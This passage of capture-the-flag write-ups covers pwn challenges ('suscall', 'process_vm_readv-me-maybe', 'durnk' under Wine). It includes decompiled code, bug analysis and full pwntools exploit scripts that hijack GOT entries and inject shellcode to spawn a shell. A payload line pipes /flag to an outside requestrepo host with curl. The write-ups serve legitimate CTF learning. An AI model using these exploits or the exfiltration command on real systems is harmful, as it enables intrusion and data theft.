4, 23, 7) seconds_since_epoch = int(time_string.timestamp()) // 86400 md5_out = hashlib.md5(f\u0026#34;{str(seconds_since_epoch)}\\n\u0026#34;.encode()).hexdigest() with open(\u0026#34;a\u0026#34;, \u0026#34;w\u0026#34;) as f: f.write(md5_out * 10) key = subprocess.getoutput( \u0026#34;echo \u0026#39;abcdefghijklmnopqrstuvwxyzabcdefghijklmnopqrstuvwxyz0123456789\u0026#39; | grep -o . | shuf --random-source ./a | tr -d \u0026#39;\\n\u0026#39;\u0026#34; ) print(key) print(url + key + \u0026#34;/\u0026#34; + payload) res = requests.get(url + key + \u0026#34;/\u0026#34; + payload, headers=header) payload.sh\n#!/bin/sh cat /flag | curl -d @- zt66v57a.requestrepo.com flag{swapnullmodem1179n24:6xx8m9vhpq4ynrgtwwaxvuvbqpiys5vbjfa79hzawygu3as9bn35psds6oqjg7s2ha_4ml2mttk_9ioajch7zw} pwn - suscall your computer is spying on you. click here to find out how to protect yourself!\nattachment\nsource-code overview this challenge makes a custom heap structure in bss section\nstruct { uint8_t chunk[heap_size]; uint8_t* heap_top; } also, it makes a custom function call galloc, it\u0026rsquo;s aborted if the requested size is greater than the heap_top pointer.\nvoid *__fastcall galloc(size_t a1) { void *s; // [rsp+28h] [rbp-8h] if ( (char *)top + a1 \u0026gt;= (char *)\u0026amp;top ) __assert_fail(\u0026#34;block_end \u0026lt; heap_end\u0026#34;, \u0026#34;main.c\u0026#34;, 0x44u, \u0026#34;galloc\u0026#34;); s = top; top = (char *)top + a1; memset(s, 0, a1); return s; } it\u0026rsquo;s also make a custom sus_file structure and a custom do_open function\nstruct susfile { void (*read_line)(void*); char* filename; char* buffer; uint8_t fd; uint8_t _padding0; uint16_t buf_size; uint16_t buf_cap; uint16_t __padding1; void (*reset)(void*); void (*open_hook)(void*); }; do_open first allocates the susfile struct, calls to sys_open, reads from that file, and exits either the content has sus string or not\nsusfile *__fastcall sus_open(char *a1, int a2) { susfile *v3; // [rsp+18h] [rbp-28h] char *dest; // [rsp+20h] [rbp-20h] size_t n; // [rsp+28h] [rbp-18h] susfile *v6; // [rsp+30h] [rbp-10h] char *buffer; // [rsp+38h] [rbp-8h] sysnum_ = 2; v3 = (susfile *)galloc(48ull); dest = (char *)galloc(16ull); v3-\u0026gt;filename = dest; v3-\u0026gt;open_hook = (void (__fastcall *)(void *))open_hook; v3-\u0026gt;read_line = (void (__fastcall *)(void *))read_file; v3-\u0026gt;reset = (void (__fastcall *)(void *))reset; n = strlen(a1); strncpy(dest, a1, n); v6 = check; if ( (flags \u0026amp; 0xfffc) == 0 ) __assert_fail(\u0026#34;flags \u0026gt; 0\u0026#34;, \u0026#34;main.c\u0026#34;, 0xbdu, \u0026#34;do_open\u0026#34;); if ( !mode ) __assert_fail(\u0026#34;mode \u0026gt; 0\u0026#34;, \u0026#34;main.c\u0026#34;, 0xbeu, \u0026#34;do_open\u0026#34;); v3-\u0026gt;fd = syscall((unsigned __int8)sysnum_, dest, (unsigned __int16)flags \u0026amp; 0xfffc, (unsigned __int8)mode); v3-\u0026gt;buffer = (char *)galloc(0x10ull); v3-\u0026gt;buf_size = 0; v3-\u0026gt;buf_cap = 16; if ( v6 ) { v6-\u0026gt;open_hook(a1); if ( !a2 ) { printf(\u0026#34;not sus: %s\\n\u0026#34;, a1); exit(0); } v6-\u0026gt;reset(v6); puts(\u0026#34;please decide what to do with this file: sus/not\u0026#34;); v6-\u0026gt;read_line(v6); buffer = v6-\u0026gt;buffer; if ( *buffer == \u0026#39;s\u0026#39; \u0026amp;\u0026amp; buffer[1] == \u0026#39;u\u0026#39; \u0026amp;\u0026amp; buffer[2] == \u0026#39;s\u0026#39; ) { printf(\u0026#34;sus alert!!!: %s!!!\\n\u0026#34;, a1); unlink(a1); exit(1); } printf(\u0026#34;not sus: %s\\n\u0026#34;, a1); exit(0); } return v3; } go to the main function, it starts by opening the file /proc/self/fd/0, and then the buffer we enter will be passed to the sus_open function if it has the sus prefix. if not, it will reset the cap_size to the 0x10 size, and perform a re-reading from the beginning\nbug in the read_file function, it\u0026rsquo;s called regalloc if the size is larger than the cap size, if our input has a null byte or newline, it stops reading and resets to read again.\nchar *__fastcall read_file(susfile *a1) { char *result; // rax unsigned int fd; // [rsp+10h] [rbp-10h] char *v3; // [rsp+18h] [rbp-8h] fd = a1-\u0026gt;fd; reset(a1); while ( 1 ) { if ( a1-\u0026gt;buf_size \u0026gt;= a1-\u0026gt;buf_cap ) resize(a1, a1-\u0026gt;buf_cap + 256); if ( a1-\u0026gt;buf_size \u0026gt;= a1-\u0026gt;buf_cap ) __assert_fail(\u0026#34;fileinfo-\u0026gt;buf_size \u0026lt; fileinfo-\u0026gt;buf_cap\u0026#34;, \u0026#34;main.c\u0026#34;, 0x10bu, \u0026#34;susfile_read_in\u0026#34;); v3 = susfile_get_buffer_end(a1); if ( (unsigned int)syscall(0ll, fd, v3, 1ll) != 1 ) __assert_fail(\u0026#34;res == 1\u0026#34;, \u0026#34;main.c\u0026#34;, 0x10fu, \u0026#34;susfile_read_in\u0026#34;); if ( *v3 == \u0026#39;\\n\u0026#39; || !*v3 ) break; ++a1-\u0026gt;buf_size; } result = v3; *v3 = 0; return result; } so, if the buffer equal to top_ptr, it updates the top_ptr without checking the \u0026lsquo;pointer\u0026rsquo; has exceeded the bound.\nif ( \u0026amp;a1[a2] == top ) { top = \u0026amp;a1[a3]; return a1; } solution i trigger the bug to overwrite the top_ptr to strlen_got\nmy idea is to overwrite the memset function with the puts function, and the top_ptr now points to the alarm_got.\nso, the next galloc will print our gift =))\nthe custom heap struct is beneath the got region, so i easily overwrite the readline function pointer with my one_gadget. fortunately, there is 1 that satisfies the condition.\nsolve script solve.py\n#!/usr/bin/env python3 # -*- coding: utf-8 -*- from pwn import * exe = \u0026#39;./sus?\u0026#39; def start(argv=[], *a, **kw): \u0026#39;\u0026#39;\u0026#39;start the exploit against the target.\u0026#39;\u0026#39;\u0026#39; if args.gdb: return process([exe] + argv, *a, **kw) if args.remote: return remote(\u0026#34;suscall.shellweplayaga.me\u0026#34;, 505) else: return process([exe] + argv, *a, **kw) gdbscript = \u0026#39;\u0026#39;\u0026#39; continue \u0026#39;\u0026#39;\u0026#39;.format(**locals()) elf = context.binary = elf(\u0026#34;./sus?\u0026#34;) io = start() ticket = b\u0026#39;ticket{nicedialup3334n24:dc18ctasmj_o6ck0wao2-q7wsmuj4w8-y719xxeqnbngyc6t}\u0026#39; if args.gdb: cmd=\u0026#34;\u0026#34;\u0026#34; handle sigalrm noignore b*0x00000000004012e1 \u0026#34;\u0026#34;\u0026#34; gdb.attach(io, cmd) if args.remote: io.sendlineafter(b\u0026#39;ticket please: \u0026#39;, ticket) libc = elf(\u0026#39;/lib/x86_64-linux-gnu/libc.so.6\u0026#39;) heap_top = 0x00000000004064a0 heap_base = 0x4040a0 pause() pl = b\u0026#39;a\u0026#39;*0x1000 + b\u0026#39;\\n\u0026#39; io.send(pl) pl = b\u0026#39;a\u0026#39;*0x1000 + b\u0026#39;\\n\u0026#39; io.send(pl) pl = b\u0026#39;a\u0026#39;*928+p32(0x404038) + b\u0026#39;\\n\u0026#39; io.send(pl) pause() pl = b\u0026#39;a\u0026#39;*8+p32(elf.plt.puts) io.send(pl) io.recvuntil(b\u0026#39;looking for sus files...\\n\u0026#39;) libc.address = u64(io.recv(6)+b\u0026#39;\\0\\0\u0026#39;) - 0xea540 print(hex(libc.address)) pause() pl = p64(0xdeadbeef)+b\u0026#39;a\u0026#39;*8+p64(libc.address+0xebc81)+b\u0026#39;\\n\u0026#39; io.send(pl) io.interactive() flag{nicedialup3334n24:6nhgaxbkopednjtjeptwpbbszgixesrul42fu_0lkpltfbre0growanos0ttzh9gd1_kgltw4x5jqdm4mf1g} pwn - process_vm_readv-me-maybe attachment\nsource-code overview in the main function, it\u0026rsquo;s called fork().\nint __cdecl main(int argc, const char **argv, const char **envp) { __int64 v3; // rcx __pid_t v4; // eax __int64 v6; // [rsp-8h] [rbp-8h] v6 = v3; init(argc, argv, envp); prctl(1499557217, -1ll, 0ll, 0ll, 0ll); v4 = fork(); if ( v4 ) return parent(v4); else return child(1499557217ll, -1ll, v6); } while the parent provides arbitrary reads and writes of the child\u0026rsquo;s memory, the child installs seccomp, calls mprotect to make its code section has all permissions rwx, then enters the loop.\nsolution my idea is to use arbitrary reads and writes in parent processes to write our shellcode to the code section of the child process.\nmy shellcode makes 3 chains:\noverwrite stdin pointer in the bss() section of parent to string /bin/sh. overwrite setbuf_got with system overwrite kill_got with init+4 get shell\n──────────────────────────────────────────────────────────────────────────[ disasm / x86-64 / set emulate on ]────────────────────────────────────────────────────────────────────────── 0x5d6760e8234d \u0026lt;init+4\u0026gt; push rax 0x5d6760e8234e \u0026lt;init+5\u0026gt; mov rdi, qword ptr [rip + 0x223b] rdi, [stdin@glibc_2.2.5] =\u0026gt; 0x73e0753d8678 ◂— 0x68732f6e69622f /* \u0026#39;/bin/sh\u0026#39; */ 0x5d6760e82355 \u0026lt;init+12\u0026gt; xor ecx, ecx ecx =\u0026gt; 0 0x5d6760e82357 \u0026lt;init+14\u0026gt; mov edx, 2 edx =\u0026gt; 2 0x5d6760e8235c \u0026lt;init+19\u0026gt; xor esi, esi esi =\u0026gt; 0 ► 0x5d6760e8235e \u0026lt;init+21\u0026gt; call setvbuf@plt \u0026lt;setvbuf@plt\u0026gt; stream: 0x73e0753d8678 ◂— 0x68732f6e69622f /* \u0026#39;/bin/sh\u0026#39; */ buf: 0 modes: 2 n: 0 solve script from pwn import * host = os.environ.get(\u0026#39;host\u0026#39;, \u0026#39;localhost\u0026#39;) port = 31337 if args.local: io = process(\u0026#34;./chall\u0026#34;) if args.gdb: cmd = \u0026#34;\u0026#34;\u0026#34; \u0026#34;\u0026#34;\u0026#34; gdb.attach(io, cmd) else: io = remote(host, int(port)) io.sendlineafter(b\u0026#39;choice: \\n\u0026#39;, b\u0026#39;1\u0026#39;) io.sendlineafter(b\u0026#39;address: \\n\u0026#39;, b\u0026#39;1\u0026#39;) io.recvuntil(b\u0026#39;value: \u0026#39;) context.arch = \u0026#34;amd64\u0026#34; stack = int(io.recv(12), 16) print(hex(stack)) ret = stack - 0x110 def readv(addr): io.sendlineafter(b\u0026#39;choice: \\n\u0026#39;, b\u0026#39;1\u0026#39;) io.sendlineafter(b\u0026#39;address: \\n\u0026#39;, hex(addr).encode()) def writev(addr, value): io.sendlineafter(b\u0026#39;choice: \\n\u0026#39;, b\u0026#39;2\u0026#39;) io.sendlineafter(b\u0026#39;value: \\n\u0026#39;, hex(value).encode()) io.sendlineafter(b\u0026#39;address: \\n\u0026#39;, hex(addr).encode()) readv(ret) io.recvuntil(b\u0026#39;value: \u0026#39;) libc = int(io.recv(12), 16) - 0x29d90 print(hex(libc)) l = stack - 0x120 readv(l) io.recvuntil(b\u0026#39;value: \u0026#39;) pie = int(io.recv(12), 16) - 0x1484 readv_helper = pie+0x1488 writev_helper = pie+0x14fc write_ = pie+0x1488+0x100 kk = write_ print(hex(write_)) pl = asm(\u0026#34;\u0026#34;\u0026#34; push 110 pop rax syscall mov r10, rax mov rdi, rax mov rsi, {} mov rdx, {} mov rcx, {} call rcx \u0026#34;\u0026#34;\u0026#34;.format(pie+0x3590, libc+0x1d8678, writev_helper)) pl += asm(\u0026#34;\u0026#34;\u0026#34; push 110 pop rax syscall mov r10, rax mov rdi, rax mov rsi, {} mov rdx, {} mov rcx, {} call rcx \u0026#34;\u0026#34;\u0026#34;.format(0x3510+pie, libc+0x50d70 , writev_helper)) pl += asm(\u0026#34;\u0026#34;\u0026#34; push 110 pop rax syscall mov r10, rax mov rdi, rax mov rsi, {} mov rdx, {} mov rcx, {} call rcx \u0026#34;\u0026#34;\u0026#34;.format(0x3500+pie,pie+0x000000000000134d , writev_helper)) for i in range((len(pl))//8 +1): writev(write_+i*8, u64(pl[i*8:(i+1)*8].ljust(8, b\u0026#39;\\x90\u0026#39;))) write_ = pie+0x1488 pl = asm(\u0026#34;\u0026#34;\u0026#34; mov rcx, {} jmp rcx \u0026#34;\u0026#34;\u0026#34;.format(kk)) for i in range((len(pl))//8 +1): writev(write_+i*8, u64(pl[i*8:(i+1)*8].ljust(8, b\u0026#39;\\x90\u0026#39;))) writev(write_-8, u64(p64(0x9090909090909090))) sleep(0.1) io.sendline(b\u0026#39;3\u0026#39;) io.sendline(b\u0026#39;./submitter\u0026#39;) flag = io.recvline_contains(b\u0026#39;livectf{\u0026#39;).decode().strip() log.info(\u0026#39;flag: %s\u0026#39;, flag) pwn - durnk (winapi) attachment\nthis is the first time i encountered a window executable run based on wine. so, i will delve into it.\nwhat is wine wine (recursive backronym for wine is not an emulator) is a compatibility layer that aims to allow computer programs (application software and computer games) developed for microsoft windows to run on unix-like operating systems. wine emulates the windows runtime environment by translating windows system calls into posix-compliant system calls, recreating the directory structure of windows systems, and providing alternative implementations of windows system libraries (from wikipedia).\nnot an emulator that creates a virtual machine in which the windows application is then executed, but a translation layer between the application and the kernel. this layer creates an environment that makes the application ‘feel’ like it’s running on a windows system, while in fact it is running on linux. debug when you have a wine application running and take a look at the active processes (for example via htop) you will notice that the application is listed as just an other linux process. this means we can examine it using gdb!\n╭─[nvm] as kyrie in ~/ctf/2024/defcon/durnk/handout 16:41:49 ╰──➤ ps aux | grep \u0026#34;challenge\u0026#34; kyrie 50236 0.0 0.0 67096 7728 pts/1 s+ 16:24 0:00 z:\\home\\kyrie\\ctf\\2024\\defcon\\durnk\\handout\\challenge.exe kyrie 53976 0.0 0.0 67096 7980 pts/2 s+ 16:38 0:00 z:\\home\\kyrie\\ctf\\2024\\defcon\\durnk\\handout\\challenge.exe kyrie 54639 0.0 0.0 12088 2432 pts/8 s+ 16:41 0:00 grep --color=auto --exclude-dir=.bzr --exclude-dir=cvs --exclude-dir=.git --exclude-dir=.hg --exclude-dir=.svn --exclude-dir=.idea --exclude-dir=.tox challenge wine actually has it’s own debugger, winedbg. but i will ignore it and use pwndbg instead =))\ni used the following this small c program to explore the memory layout of the wine process and compile this with this command: (make sure we have mingw downloaded)\n$ x86_64-w64-mingw32-gcc -o test.exe test.c test.c\n#include \u0026lt;windows.h\u0026gt; #include \u0026lt;stdio.h\u0026gt; int winapi winmain(hinstance hinstance, hinstance hprevinstance, lpstr lpcmdline, int nshowcmd) { printf(\u0026#34;winmain:\\t\\t%p\\n\u0026#34;,winmain); hmodule kernel32 = loadlibrary(\u0026#34;kernel32.dll\u0026#34;); printf(\u0026#34;kernel32.dll:\\t\\t%p\\n\u0026#34;,kernel32); printf(\u0026#34;getprocaddress:\\t\\t%p\\n\u0026#34;,getprocaddress); hmodule msvcrt = loadlibrary(\u0026#34;msvcrt.dll\u0026#34;); printf(\u0026#34;msvcrt.dll:\\t\\t%p\\n\u0026#34;,msvcrt); hmodule ntdll = loadlibrary(\u0026#34;ntdll.dll\u0026#34;); printf(\u0026#34;ntdll.dll:\\t\\t%p\\n\u0026#34;,ntdll); int dummy; printf(\u0026#34;stack:\\t\\t\\t%p\\n\u0026#34;,\u0026amp;dummy); void *heap = malloc(128); printf(\u0026#34;heap:\\t\\t\\t%p\\n\u0026#34;,heap); getchar(); return 0; } run this test through wine\n$ wine test.exe in another terminal, type this command:\ngdb -p $(pgrep -f test.exe) let’s take a closer look at the memory of the test.exe process via gdb’s vmmap command:\npwndbg\u0026gt; vmmap legend: stack | heap | code | data | rwx | rodata start end perm size offset file 0x7bb50000 0x7bb51000 r--p 1000 0 /opt/wine-stable/lib64/wine/x86_64-windows/msvcrt.dll 0x7bb51000 0x7bbc0000 r-xp 6f000 1000 /opt/wine-stable/lib64/wine/x86_64-windows/msvcrt.dll 0x7bbc0000 0x7bbc4000 rw-p 4000 70000 /opt/wine-stable/lib64/wine/x86_64-windows/msvcrt.dll 0x7bbc4000 0x7bbdf000 r--p 1b000 74000 /opt/wine-stable/lib64/wine/x86_64-windows/msvcrt.dll 0x7bbdf000 0x7bbe1000 rw-p 2000 0 [anon_7bbdf] 0x7bbe1000 0x7bbe8000 r--p 7000 8f000 /opt/wine-stable/lib64/wine/x86_64-windows/msvcrt.dll 0x7bbe8000 0x7bbeb000 rw-p 3000 96000 /opt/wine-stable/lib64/wine/x86_64-windows/msvcrt.dll 0x7bbeb000 0x7bea6000 r--p 2bb000 99000 /opt/wine-stable/lib64/wine/x86_64-windows/msvcrt.dll 0x7fde0000 0x7ffc0000 ---p 1e0000 0 [anon_7fde0] 0x7ffc0000 0x7ffe0000 rw-p 20000 0 [anon_7ffc0] 0x7ffe0000 0x7ffe1000 r--p 1000 0 /tmp/.wine-1000/server-803-72295/tmpmap-6be2772d (deleted) 0x7ffe1000 0x7ffe2000 rw-p 1000 0 [anon_7ffe1] 0x7ffe2000 0x7fff0000 ---p e000 0 [anon_7ffe2] 0x140000000 0x140001000 r--p 1000 0 /home/kyrie/ctf/2024/defcon/durnk/handout/test.exe 0x140001000 0x140008000 r-xp 7000 0 [anon_140001] 0x140008000 0x140009000 rw-p 1000 0 [anon_140008] 0x140009000 0x14000c000 r--p 3000 0 [anon_140009] 0x14000c000 0x14000d000 rw-p 1000 0 [anon_14000c] 0x14000d000 0x14000e000 rw-p 1000 9000 /home/kyrie/ctf/2024/defcon/durnk/handout/test.exe 0x14000e000 0x140010000 rw-p 2000 0 [anon_14000e] 0x140010000 0x14007e000 r--p 6e000 0 [anon_140010] 0x5555562bb000 0x5555562dc000 rw-p 21000 0 [heap] 0x6fffff440000 0x6fffff441000 r--p 1000 0 /opt/wine-stable/lib64/wine/x86_64-windows/kernelbase.dll 0x6fffff441000 0x6fffff4cd000 r-xp 8c000 1000 /opt/wine-stable/lib64/wine/x86_64-windows/kernelbase.dll 0x6fffff4cd000 0x6fffff4d1000 rw-p 4000 8d000 /opt/wine-stable/lib64/wine/x86_64-windows/kernelbase.dll 0x6fffff4d1000 0x6fffff4f8000 r--p 27000 91000 /opt/wine-stable/lib64/wine/x86_64-windows/kernelbase.dll 0x6fffff4f8000 0x6fffff4fb000 rw-p 3000 0 [anon_6fffff4f8] 0x6fffff4fb000 0x6fffff506000 r--p b000 b8000 /opt/wine-stable/lib64/wine/x86_64-windows/kernelbase.dll 0x6fffff506000 0x6fffff6d7000 rw-p 1d1000 c3000 /opt/wine-stable/lib64/wine/x86_64-windows/kernelbase.dll 0x6fffff6d7000 0x6fffffa68000 r--p 391000 294000 /opt/wine-stable/lib64/wine/x86_64-windows/kernelbase.dll 0x6fffffa80000 0x6fffffa81000 r--p 1000 0 /opt/wine-stable/lib64/wine/x86_64-windows/kernel32.dll 0x6fffffa81000 0x6fffffab2000 r-xp 31000 1000 /opt/wine-stable/lib64/wine/x86_64-windows/kernel32.dll 0x6fffffab2000 0x6fffffab5000 rw-p 3000 32000 /opt/wine-stable/lib64/wine/x86_64-windows/kernel32.dll 0x6fffffab5000 0x6fffffac3000 r--p e000 35000 /opt/wine-stable/lib64/wine/x86_64-windows/kernel32.dll 0x6fffffac3000 0x6fffffac4000 rw-p 1000 0 [anon_6fffffac3] 0x6fffffac4000 0x6fffffacf000 r--p b000 43000 /opt/wine-stable/lib64/wine/x86_64-windows/kernel32.dll 0x6fffffacf000 0x6fffffae2000 rw-p 13000 4e000 /opt/wine-stable/lib64/wine/x86_64-windows/kernel32.dll 0x6fffffae2000 0x6fffffc39000 r--p 157000 61000 /opt/wine-stable/lib64/wine/x86_64-windows/kernel32.dll 0x6fffffc50000 0x6fffffc51000 r--p 1000 0 /opt/wine-stable/lib64/wine/x86_64-windows/ntdll.dll 0x6fffffc51000 0x6fffffcbe000 r-xp 6d000 1000 /opt/wine-stable/lib64/wine/x86_64-windows/ntdll.dll 0x6fffffcbe000 0x6fffffcc2000 rw-p 4000 6e000 /opt/wine-stable/lib64/wine/x86_64-windows/ntdll.dll 0x6fffffcc2000 0x6fffffce5000 r--p 23000 72000 /opt/wine-stable/lib64/wine/x86_64-windows/ntdll.dll 0x6fffffce5000 0x6fffffce9000 rw-p 4000 0 [anon_6fffffce5] 0x6fffffce9000 0x6fffffcf4000 r--p b000 95000 /opt/wine-stable/lib64/wine/x86_64-windows/ntdll.dll 0x6fffffcf4000 0x6fffffcf6000 rw-p 2000 a0000 /opt/wine-stable/lib64/wine/x86_64-windows/ntdll.dll 0x6fffffcf6000 0x6ffffffea000 r--p 2f4000 a2000 /opt/wine-stable/lib64/wine/x86_64-windows/ntdll.dll 0x79971c900000 0x79971cc00000 rw-p 300000 0 [anon_79971c900] 0x79971cc00000 0x79971d442000 r--p 842000 0 /usr/lib/locale/locale-archive 0x79971d500000 0x79971d600000 rw-p 100000 0 [anon_79971d500] 0x79971d600000 0x79971d628000 r--p 28000 0 /usr/lib/x86_64-linux-gnu/libc.so.6 0x79971d628000 0x79971d7bd000 r-xp 195000 28000 /usr/lib/x86_64-linux-gnu/libc.so.6 0x79971d7bd000 0x79971d815000 r--p 58000 1bd000 /usr/lib/x86_64-linux-gnu/libc.so.6 0x79971d815000 0x79971d816000 ---p 1000 215000 /usr/lib/x86_64-linux-gnu/libc.so.6 0x79971d816000 0x79971d81a000 r--p 4000 215000 /usr/lib/x86_64-linux-gnu/libc.so.6 0x79971d81a000 0x79971d81c000 rw-p 2000 219000 /usr/lib/x86_64-linux-gnu/libc.so.6 0x79971d81c000 0x79971d829000 rw-p d000 0 [anon_79971d81c] 0x79971d857000 0x79971d85a000 r--p 3000 0 /usr/lib/x86_64-linux-gnu/liblzma.so.5.2.5 0x79971d85a000 0x79971d875000 r-xp 1b000 3000 /usr/lib/x86_64-linux-gnu/liblzma.so.5.2.5 0x79971d875000 0x79971d880000 r--p b000 1e000 /usr/lib/x86_64-linux-gnu/liblzma.so.5.2.5 0x79971d880000 0x79971d881000 r--p 1000 28000 /usr/lib/x86_64-linux-gnu/liblzma.so.5.2.5 0x79971d881000 0x79971d882000 rw-p 1000 29000 /usr/lib/x86_64-linux-gnu/liblzma.so.5.2.5 0x79971d882000 0x79971d884000 r--p 2000 0 /usr/lib/x86_64-linux-gnu/libunwind.so.8.0.1 0x79971d884000 0x79971d88e000 r-xp a000 2000 /usr/lib/x86_64-linux-gnu/libunwind.so.8.0.1 0x79971d88e000 0x79971d891000 r--p 3000 c000 /usr/lib/x86_64-linux-gnu/libunwind.so.8.0.1 0x79971d891000 0x79971d892000 r--p 1000 e000 /usr/lib/x86_64-linux-gnu/libunwind.so.8.0.1 0x79971d892000 0x79971d893000 rw-p 1000 f000 /usr/lib/x86_64-linux-gnu/libunwind.so.8.0.1 0x79971d893000 0x79971d89d000 rw-p a000 0 [anon_79971d893] 0x79971d89d000 0x79971d8a7000 r--p a000 0 /opt/wine-stable/lib64/wine/x86_64-unix/ntdll.so 0x79971d8a7000 0x79971d903000 r-xp 5c000 a000 /opt/wine-stable/lib64/wine/x86_64-unix/ntdll.so 0x79971d903000 0x79971d920000 r--p 1d000 66000 /opt/wine-stable/lib64/wine/x86_64-unix/ntdll.so 0x79971d920000 0x79971d922000 r--p 2000 82000 /opt/wine-stable/lib64/wine/x86_64-unix/ntdll.so 0x79971d922000 0x79971d923000 rw-p 1000 84000 /opt/wine-stable/lib64/wine/x86_64-unix/ntdll.so 0x79971d923000 0x79971d95b000 rw-p 38000 0 [anon_79971d923] 0x79971d95b000 0x79971d95c000 r--p 1000 0 /usr/lib/x86_64-linux-gnu/libdl.so.2 0x79971d95c000 0x79971d95d000 r-xp 1000 1000 /usr/lib/x86_64-linux-gnu/libdl.so.2 0x79971d95d000 0x79971d95e000 r--p 1000 2000 /usr/lib/x86_64-linux-gnu/libdl.so.2 0x79971d95e000 0x79971d95f000 r--p 1000 2000 /usr/lib/x86_64-linux-gnu/libdl.so.2 0x79971d95f000 0x79971d960000 rw-p 1000 3000 /usr/lib/x86_64-linux-gnu/libdl.so.2 0x79971d960000 0x79971d961000 r--p 1000 0 /usr/lib/x86_64-linux-gnu/libpthread.so.0 0x79971d961000 0x79971d962000 r-xp 1000 1000 /usr/lib/x86_64-linux-gnu/libpthread.so.0 0x79971d962000 0x79971d963000 r--p 1000 2000 /usr/lib/x86_64-linux-gnu/libpthread.so.0 0x79971d963000 0x79971d964000 r--p 1000 2000 /usr/lib/x86_64-linux-gnu/libpthread.so.0 0x79971d964000 0x79971d965000 rw-p 1000 3000 /usr/lib/x86_64-linux-gnu/libpthread.so.0 0x79971d978000 0x79971d97a000 rw-p 2000 0 [anon_79971d978] 0x79971d97a000 0x79971d97c000 r--p 2000 0 /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2 0x79971d97c000 0x79971d9a6000 r-xp 2a000 2000 /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2 0x79971d9a6000 0x79971d9b1000 r--p b000 2c000 /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2 0x79971d9b1000 0x79971d9b2000 ---p 1000 37000 /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2 0x79971d9b2000 0x79971d9b4000 r--p 2000 37000 /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2 0x79971d9b4000 0x79971d9b6000 rw-p 2000 39000 /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2 0x79971d9b6000 0x79971d9b7000 r--p 1000 0 /opt/wine-stable/bin/wine64 0x79971d9b7000 0x79971d9b8000 r-xp 1000 1000 /opt/wine-stable/bin/wine64 0x79971d9b8000 0x79971d9b9000 r--p 1000 2000 /opt/wine-stable/bin/wine64 0x79971d9b9000 0x79971d9ba000 r--p 1000 2000 /opt/wine-stable/bin/wine64 0x79971d9ba000 0x79971d9bb000 rw-p 1000 3000 /opt/wine-stable/bin/wine64 0x79971d9bb000 0x79971d9bc000 r--p 1000 0 /opt/wine-stable/bin/wine64-preloader 0x79971d9bc000 0x79971d9be000 r-xp 2000 1000 /opt/wine-stable/bin/wine64-preloader 0x79971d9be000 0x79971d9bf000 r--p 1000 3000 /opt/wine-stable/bin/wine64-preloader 0x79971d9bf000 0x79971d9c1000 rw-p 2000 3000 /opt/wine-stable/bin/wine64-preloader 0x7ffc5b674000 0x7ffc5b695000 rw-p 21000 0 [stack] 0x7ffc5b749000 0x7ffc5b74d000 r--p 4000 0 [vvar] 0x7ffc5b74d000 0x7ffc5b74f000 r-xp 2000 0 [vdso] 0x7ffffe000000 0x7ffffe100000 rw-p 100000 0 [anon_7ffffe000] 0x7ffffe100000 0x7ffffe102000 ---p 2000 0 [anon_7ffffe100] 0x7ffffe102000 0x7ffffe300000 rw-p 1fe000 0 [anon_7ffffe102] 0x7ffffe300000 0x7ffffe311000 r--p 11000 0 /opt/wine-stable/lib64/wine/x86_64-windows/apisetschema.dll 0x7ffffe311000 0x7ffffe320000 ---p f000 0 [anon_7ffffe311] 0x7ffffe320000 0x7ffffe33a000 rw-p 1a000 0 [anon_7ffffe320] 0x7ffffe33a000 0x7ffffe340000 ---p 6000 0 [anon_7ffffe33a] 0x7ffffe340000 0x7ffffe3fa000 r--p ba000 0 /opt/wine-stable/share/wine/nls/locale.nls 0x7ffffe3fa000 0x7ffffe400000 ---p 6000 0 [anon_7ffffe3fa] 0x7ffffe400000 0x7ffffe402000 r--p 2000 0 /opt/wine-stable/share/wine/nls/l_intl.nls 0x7ffffe402000 0x7ffffe410000 ---p e000 0 [anon_7ffffe402] 0x7ffffe410000 0x7ffffe421000 r--p 11000 0 /opt/wine-stable/share/wine/nls/c_1252.nls 0x7ffffe421000 0x7ffffe430000 ---p f000 0 [anon_7ffffe421] 0x7ffffe430000 0x7ffffe441000 r--p 11000 0 /opt/wine-stable/share/wine/nls/c_437.nls 0x7ffffe441000 0x7ffffe450000 ---p f000 0 [anon_7ffffe441] 0x7ffffe450000 0x7ffffe550000 rw-p 100000 0 [anon_7ffffe450] 0x7ffffe550000 0x7ffffe889000 r--p 339000 0 /opt/wine-stable/share/wine/nls/sortdefault.nls 0x7ffffe889000 0x7ffffe890000 ---p 7000 0 [anon_7ffffe889] 0x7ffffe890000 0x7ffffe89f000 r--p f000 0 /opt/wine-stable/share/wine/nls/normnfc.nls 0x7ffffe89f000 0x7ffffe8a0000 ---p 1000 0 [anon_7ffffe89f] 0x7ffffe8a0000 0x7ffffe8ba000 rw-p 1a000 0 [anon_7ffffe8a0] 0x7ffffe8ba000 0x7ffffe8c0000 ---p 6000 0 [anon_7ffffe8ba] 0x7ffffe8c0000 0x7ffffe8d1000 r--p 11000 0 /opt/wine-stable/share/wine/nls/c_20127.nls 0x7ffffe8d1000 0x7fffffdb0000 ---p 14df000 0 [anon_7ffffe8d1] 0x7fffffdb0000 0x7fffffff0000 rw-p 240000 0 [anon_7fffffdb0] 0xffffffffff600000 0xffffffffff601000 --xp 1000 0 [vsyscall] pwndbg\u0026gt; and here is the output we got:\n╭─[nvm] as kyrie in ~/ctf/2024/defcon/durnk/handout 17:33:31 ╰──➤ wine test.exe winmain: 00000001400015a1 kernel32.dll: 00006fffffa80000 getprocaddress: 00006fffffa98a60 msvcrt.dll: 000000007bb50000 ntdll.dll: 00006fffffc50000 stack: 00007ffffe2ffe4c heap: 00007ffffe8a0c70 there are a few things to notice:\nno readable/writable/executable (rwx) memory the windows executable (challenge.exe) with its sections is mapped beginning at 0x140000000 there are many libraries expected in a standard linux process there are other libraries you do not expect at all on a linux system, like kernel32.dll, ntdll.dll, msvcrt.dll and ntdll.so the heap and the stack quite close there is a region marked as stack (at 0x7ffc5b674000), but it’s different from the stack used by the application (the printdata output was 0x7ffffe2ffe4c) same goes for the heap: gdb sees one at 0x5555562bb000 , but the application uses a different heap beginning at 0x7ffffe8a0c70 pwndbg\u0026gt; x/2i 0x7ffff7d147e2 0x7ffff7d147e2 \u0026lt;__gi___libc_read+18\u0026gt;: cmp rax,0xfffffffffffff000 0x7ffff7d147e8 